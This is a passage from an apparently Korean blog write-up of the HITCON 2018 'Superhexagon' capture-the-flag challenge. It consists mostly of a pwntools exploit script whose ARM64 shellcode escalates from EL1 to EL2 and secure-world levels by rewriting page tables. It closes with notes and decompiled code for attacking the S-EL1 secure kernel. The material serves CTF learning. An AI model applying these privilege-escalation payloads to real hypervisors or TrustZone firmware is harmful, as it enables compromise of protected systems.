</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(TCI_Data)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_tci
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // unlink AAW trigger
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, 0x0010, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, 0x0050, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #16] // data + 4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #20] // this is needed to get out of the freelist loop.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // get .text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x0300, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_copy:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x20, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(SEL0_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_copy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_print_flag_sel0:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x20</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_print_flag_sel0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) 
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x250</span><span style="color:#f92672">-</span> len(EL2_shellcode)) <span style="color:#f92672">+</span> TCI_Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span>EL2_shellcode
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>IPA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2400</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">0b11</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># s2ap 11</span>
</span></span><span style="display:flex;"><span>DESC <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100000</span>
</span></span><span style="display:flex;"><span>EL2_TEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffeffffa000</span>
</span></span><span style="display:flex;"><span>entry_user <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0028000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfd0</span>
</span></span><span style="display:flex;"><span>user_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2403</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x0020000000000000</span><span style="color:#75715e"># ap 01</span>
</span></span><span style="display:flex;"><span>EL2_shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffc100</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, #1 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(IPA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>(DESC)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // PA 0x0000000040102000 RWX
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry_user)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(user_val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11] // IPA 0x0000000000002000 RW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(EL2_TEXT)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>(EL2_shellcode_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x12, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>len(EL2_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // trigger!!!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // IPA 0x37000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> EL2_shellcode 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(payload) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x500</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x500</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> SEL0_shellcode
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="s-el1-secure-kernel">S-EL1, Secure kernel<a hidden class="anchor" aria-hidden="true" href="#s-el1-secure-kernel">#</a></h1>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/23f1facbdfa91f4017c01619b48b53ce.png" alt=""  />

이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다.
실질적으로 Secure world는 EL0&amp;1 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다.
S-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_0800087c</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span>(ctx.r0) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000003</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000724</span>(ctx.r1,ctx.r2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000004</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000790</span>(ctx.r1,ctx.r2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000005</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080007ea</span>(ctx.r1,ctx.r2);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000006</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800083e</span>(ctx.r1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000007</span>,local_c);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>먼저 EL2에서 S-EL3를 거쳐 S-EL1까지 도달할 경우 위 핸들러를 만나게 된다.</p>
<p>0x83000006은 S-EL0까지 내려가는 케이스이니 이를 제외하고 분석하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_08000724</span>(uint r1,uint r2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  
